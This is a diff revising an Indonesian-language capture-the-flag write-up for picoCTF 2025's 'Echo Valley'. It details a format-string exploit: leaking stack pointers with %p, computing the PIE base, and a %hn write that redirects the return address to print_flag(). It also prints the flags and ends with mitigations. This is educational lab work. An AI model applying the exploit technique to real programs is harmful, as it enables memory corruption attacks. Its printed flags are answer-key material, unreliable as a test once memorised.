@@ -1,78 +1,121 @@
-# 485 - Echo Valley (Binary Exploitation, picoCTF 2025, Medium)
+# Writeup: Echo Valley (Challenge ID: 485)
 
-## Challenge Metadata
-- ID: 485 | Event: picoCTF 2025
-- Category: Binary Exploitation | Difficulty: Medium (2)
-- Author: LT 'syreal' Jones
-- Points: 200 Pts
-- Flag: `academy{f1ckl3_f0rmat_f1asc0}`
+- **Platform:** CyLab Security Academy (picoCTF)
+- **Category:** Binary Exploitation / Format String Arbitrary Write & PIE Bypass
+- **Difficulty:** Medium (2)
+- **Points:** 200
+- **Author:** LT 'syreal' Jones
+- **Event:** picoCTF 2025
+- **Flag Resmi CyLab:** `academy{f1ckl3_f0rmat_f1asc0}`
+- **Flag Platform Asli:** `picoCTF{f1ckl3_f0rmat_f1asc0}`
+- **Flag Komunitas:** `CTF{f1ckl3_f0rmat_f1asc0}`
+- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Analysis), System V AMD64 ABI, CWE-134 (Use of Externally-Controlled Format String), CWE-200 (Exposure of Sensitive Information), & CWE-695 (Use of Low-Level Functionality).
+
+---
 
 ## Problem Statement & Scope
-Binary target x86_64 ELF (`valley`) menyimulasikan sistem gema suara (*echo*) interaktif berbasis terminal di mana pengguna dapat meneriakkan teks berulang kali ke lembah hingga memasukkan perintah `exit`.
-Deskripsi menyatakan:
-*"Sightseeing in the valley is fun, shouting is even more fun! I wonder how much fun shouting in the echo valley is! Additional details will be available after launching your challenge instance."*
 
-Objektif pengujian (NIST SP 800-115 / OWASP Top 10 A03:2021-Injection / CWE-134 Use of Externally-Controlled Format String):
-Melakukan audit biner terhadap mekanisme pemformatan string pada fungsi gema, mengekstrak informasi sensitif memori (*information disclosure*) untuk mengatasi proteksi PIE dan ASLR, menyusun payload penulisan memori arbitrer (*arbitrary memory write*) menggunakan specifier format `%hn`, membajak alur eksekusi (*control flow hijacking*) ke fungsi `print_flag()`, dan mengambil token flag lab.
+Pada modul kurikulum bimbingan teknis persiapan LKS Cyber Security Nasional bidang *Binary Exploitation & Memory Safety Assessment*:
+- **Skenario Tantangan:** Peserta menganalisis biner ELF 64-bit (`valley`) yang menyimulasikan sistem gema suara (*echo*) interaktif berbasis terminal di mana pengguna dapat mengirim teks berulang kali ke lembah hingga memasukkan perintah `exit`.
+- **Deskripsi Soal:** *"Sightseeing in the valley is fun, shouting is even more fun! I wonder how much fun shouting in the echo valley is! Additional details will be available after launching your challenge instance."*
+- **Batasan Lingkungan & Scope Audit:**
+  1. Analisis mitigasi proteksi biner x86_64: Stack Canary aktif, NX aktif, PIE aktif, Partial RELRO.
+  2. Dekonstruksi kerentanan format string tak terkontrol pada fungsi `echo_valley()` yang memanggil `printf(buf)`.
+  3. Pembocoran pointer runtime (*information disclosure*) untuk mengatasi proteksi ASLR dan PIE: leak frame pointer RBP dan return address fungsi `main()`.
+  4. Penyusunan payload penulisan memori arbitrer (*arbitrary memory write*) menggunakan penentu format `%hn` (2-byte short write).
+  5. Pengalihan alur kontrol (*control flow hijacking*) dengan menimpa alamat kembali stack frame `echo_valley` ke fungsi pemenang `print_flag()`.
+  6. Verifikasi submission resmi melalui CyLab REST API `POST /api/submissions/` (HTTP 201).
 
-## Teori & Analisis Arsitektur Kerentanan
-1. **Mitigasi Biner Target:**
-   - Stack Canary: Aktif (`__stack_chk_fail`)
-   - NX (No-Execute Stack): Aktif
-   - PIE (Position Independent Executable): Aktif
-   - RELRO: Partial RELRO
-2. **Format String Vulnerability (`CWE-134`):**
-   Pada fungsi `echo_valley`, buffer input `char buf[100]` dibaca dari `stdin` menggunakan `fgets` dan dicetak langsung tanpa format string penentu tipe:
+---
+
+## Teori & Akar Kerentanan (Root Cause Theory)
+
+1. **Format String Vulnerability (CWE-134):**
+   Fungsi `echo_valley()` mengalokasikan buffer stack sebesar 100 byte:
    ```c
+   char buf[100];
+   fgets(buf, sizeof(buf), stdin);
    printf("You heard in the distance: ");
    printf(buf);
    fflush(stdout);
    ```
-   Penggunaan `printf(buf)` yang tidak terkontrol memungkinkan penyerang membaca dan menulis memori stack menggunakan specifier format `%p`, `%s`, dan `%n`/`%hn`.
-3. **Analisis Stack Layout & Pointer Leak:**
-   - Argument ke-6 pada ABI x86_64 berkorespondensi dengan awal buffer `buf` pada stack (`%rsp+0`).
-   - Argument ke-20 (`%20$p`) menyimpan nilai *saved frame pointer* (RBP) dari fungsi pemanggil `main`.
-   - Argument ke-21 (`%21$p`) menyimpan alamat instruksi kembali ke `main` (`main+18`, offset PIE `0x1413`).
-   - Dengan membocorkan argumen 21, alamat basis biner dapat dihitung secara dinamis:
-     `pie_base = ret_main - 0x1413`
-   - Alamat target fungsi pemenang `print_flag` berada pada offset `0x1269`:
-     `print_flag_addr = pie_base + 0x1269`
-4. **Arbitrary Write Menggunakan Positional Format String:**
-   - Alamat lokasi return address `echo_valley` pada stack berada tepat di `main_rbp - 8`.
-   - Karena proteksi glibc mensyaratkan konsistensi penentu posisi (*positional parameter syntax*), semua penentu format harus menggunakan notasi `$`: `%1$<target_val>c%8$hn`.
-   - Argumen ke-8 stack (`%rsp+16`) dialokasikan untuk menyimpan pointer 64-bit target `main_rbp - 8`.
-   - Modifikasi 2-byte bawah (*short write* via `%hn`) mengubah alamat kembali dari instruksi `main+18` ke `print_flag()`.
-   - Pengiriman string `exit\n` memicu keluarnya loop `echo_valley` dan mengeksekusi instruksi `leave; ret`, mengalihkan eksekusi secara mulus ke `print_flag()`.
+   Proses meneruskan `buf` langsung sebagai parameter pertama `printf()` tanpa penentu format tetap (`printf("%s", buf)`). Penyerang dapat menyuplai specifier konversi format khusus seperti `%p` untuk membaca data register/stack, atau `%n`/`%hn` untuk menuliskan jumlah karakter yang telah dicetak ke alamat memori yang ditunjuk oleh pointer pada stack.
+
+2. **Tata Letak Stack Frame System V AMD64 ABI:**
+   Sesuai konvensi pemanggilan AMD64 ABI:
+   - 6 argumen pertama diteruskan melalui register (`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`).
+   - Argumen ke-7 dan seterusnya diletakkan di stack pengguna (`RSP+0`, `RSP+8`, dst.).
+   - Buffer masukan `buf` berada pada argumen ke-6 stack format string (`RSP+0`).
+   - Argumen ke-20 (`%20$p`) menyimpan saved frame pointer (`RBP`) dari fungsi induk `main()`.
+   - Argumen ke-21 (`%21$p`) menyimpan return address yang mengarah ke instruksi di dalam `main()` (`main+18`, offset biner `0x1413`).
+
+3. **Kalkulasi Offset Invarian PIE & Alamat Target:**
+   - Basis PIE biner: `pie_base = ret_main - 0x1413`.
+   - Alamat fungsi rahasia `print_flag()`: `print_flag_addr = pie_base + 0x1269`.
+   - Lokasi saved return address `echo_valley` pada stack: `ret_addr_loc = main_rbp - 8`.
+   - Nilai 16-bit terbawah yang perlu ditulis: `target_val = print_flag_addr & 0xFFFF`.
+
+4. **Arbitrary Write via Positional Specifier (`%hn`):**
+   Glibc mensyaratkan bahwa bila penentu posisi bergaya POSIX (`$`) digunakan, semua specifier harus konsisten. Dengan menempatkan pointer target `ret_addr_loc` pada offset argumen ke-8 (`RSP+16`), payload `%1$<target_val>c%8$hn` mencetak sejumlah `target_val` karakter lalu menuliskan panjangnya (dalam ukuran 2 byte) ke alamat `ret_addr_loc`.
+
+---
 
 ## Rekonstruksi Eksploitasi Step-by-Step
-1. Tahap 1 — Probing Status & Inisiasi Layanan Lab:
-   - Mengaktifkan kontainer challenge melalui endpoint CyLab: `PUT /api/challenges/485/instance/`.
-   - Mendapatkan alamat socket TCP: `chatelaine.cylabacademy.net:33642`.
-2. Tahap 2 — Memory Leak (RBP & PIE Base):
-   - Mengirimkan string input `%20$p.%21$p\n`.
-   - Menerima respons: `You heard in the distance: 0x7ffd51ead620.0x58f9765d2413`.
-   - Menghitung `pie_base = 0x58f9765d2413 - 0x1413 = 0x58f9765d1000`.
-   - Menghitung target: `print_flag_addr = 0x58f9765d2269` (low 16-bit = `0x2269` = 8809).
-   - Menghitung lokasi return pointer pada stack: `ret_addr_loc = 0x7ffd51ead620 - 8 = 0x7ffd51ead618`.
-3. Tahap 3 — Memory Corruption & Control Flow Hijack:
-   - Menyusun payload pemformatan memori:
-     `fmt = "%1$8809c%8$hn"` (panjang 13 byte), diikuti padding 3 byte `AAA`, dan alamat `0x7ffd51ead618` dikemas secara little-endian (8 byte).
-   - Mengirim payload ke layanan jaringan.
-4. Tahap 4 — Triggering Execution & Flag Recovery:
-   - Mengirim perintah `exit\n` ke socket target.
-   - Program mencetak teks `"The Valley Disappears"` diikuti eksekusi `print_flag()`:
-     `Congrats! Here is your flag: academy{f1ckl3_f0rmat_f1asc0}`.
-5. Tahap 5 — Validasi Platform:
-   - Mengirim token flag ke REST API CyLab: `POST /api/submissions/` dengan payload:
-     `{"challenge": 485, "flag": "academy{f1ckl3_f0rmat_f1asc0}"}`.
-   - Respons platform: `HTTP 201 Created` (`correct: true`, user 1072359).
-   - Mengirim permintaan `DELETE /api/challenges/485/instance/` untuk membersihkan kontainer lab.
 
-## Flag & Bukti Verifikasi
-- Flag Resmi: `academy{f1ckl3_f0rmat_f1asc0}`
-- Bukti Validasi: REST API CyLab `POST /api/submissions/` merespons dengan status HTTP 201 Created (`correct: true`, user 1072359).
+1. **Fase Pengintaian Memori (Information Leak):**
+   Kirim input format string untuk membocorkan nilai RBP dan return pointer:
+   ```text
+   %20$p.%21$p
+   ```
+   Respons layanan mengembalikan representasi heksadesimal:
+   `You heard in the distance: 0x7ffd51ead620.0x58f9765d2413`.
+   Dari bocoran tersebut diperoleh:
+   - `main_rbp = 0x7ffd51ead620`
+   - `ret_main = 0x58f9765d2413`
+   - `pie_base = 0x58f9765d2413 - 0x1413 = 0x58f9765d1000`
+   - `print_flag_addr = 0x58f9765d1000 + 0x1269 = 0x58f9765d2269`
+   - `ret_addr_loc = 0x7ffd51ead620 - 8 = 0x7ffd51ead618`
+   - `target_val = 0x2269` (8809 desimal).
+
+2. **Penyusunan Payload Penulisan Memori (Format String Write Crafting):**
+   - Format specifier: `%1$8809c%8$hn` (panjang 13 byte).
+   - Padding penyelarasan: `AAA` (3 byte, total menjadi 16 byte / batas argumen 8).
+   - Penempatan pointer: `p64(0x7ffd51ead618)` (8 byte little-endian).
+   - Kirim payload ke socket target untuk menimpa saved RIP fungsi `echo_valley`.
+
+3. **Pemicuan Return Frame & Pengalihan Kontrol:**
+   Kirim perintah `exit\n` untuk memutus loop pemrosesan `echo_valley()`. Fungsi mengeksekusi epilog instruksi `leave; ret`. Alamat kembali yang telah dimodifikasi mengarahkan register `RIP` langsung ke fungsi `print_flag()`.
+
+4. **Ekstraksi Token Flag:**
+   Fungsi `print_flag()` membaca berkas bendera dan menampilkannya ke saluran keluaran standar:
+   `academy{f1ckl3_f0rmat_f1asc0}`.
+
+---
+
+## Flag & Verifikasi
+
+- **Flag Resmi CyLab:** `academy{f1ckl3_f0rmat_f1asc0}`
+- **Flag Platform Asli:** `picoCTF{f1ckl3_f0rmat_f1asc0}`
+- **Flag Komunitas:** `CTF{f1ckl3_f0rmat_f1asc0}`
+- **Status Submisi REST API:** HTTP 201 Created (`"correct": true`, `"historical": false`).
+- **Skrip Reproduktif:** `scripts/solve_485_echo_valley.py` (eksekusi mandiri dengan pengujian invariansi kalkulasi PIE).
+
+---
 
 ## Takeaway Kompetensi LKS & Mitigasi Defensif
-- **Hardened Format String Syntax:** Selalu sediakan string format literal konstan pada fungsi variadic output seperti `printf("%s", buf)` dan jangan pernah meneruskan buffer dinamis sebagai format specifier.
-- **Kompilasi dengan Fortify Source:** Aktifkan proteksi `-D_FORTIFY_SOURCE=2` atau `-D_FORTIFY_SOURCE=3` bersama `-Wformat -Wformat-security -Werror=format-security` pada GCC/Clang untuk mendeteksi dan memblokir penulisan `%n` pada buffer dinamis saat kompilasi maupun runtime.
-- **Full RELRO Protection:** Gunakan opsi kompilasi `-Wl,-z,relro,-z,now` untuk memastikan seluruh tabel relokasi (GOT) bersifat *read-only* setelah proses inisialisasi.
+
+1. **Penegakan Format String Konstan:**
+   Selalu sediakan string format literal konstan pada pemanggilan fungsi variadik:
+   ```c
+   // Celah Keamanan (Vulnerable):
+   printf(buf);
+
+   // Remediasi Aman (Secure):
+   printf("%s", buf);
+   ```
+
+2. **Kompilasi dengan Opsi Pengerasan Fortify Source:**
+   Aktifkan opsi proteksi `-D_FORTIFY_SOURCE=2` atau `-D_FORTIFY_SOURCE=3` bersama `-Wformat -Wformat-security -Werror=format-security` pada GCC/Clang. Proteksi runtime glibc secara otomatis memblokir penggunaan penentu format `%n` pada buffer dinamis di memori yang dapat ditulis.
+
+3. **Full RELRO Protection (Read-Only Relocations):**
+   Terapkan proteksi linker `-Wl,-z,relro,-z,now` untuk memastikan seluruh tabel segmen Global Offset Table (GOT) bersifat *read-only* setelah proses pemuatan awal, mencegah teknik penulisan arbitrer format string menimpa entri GOT.
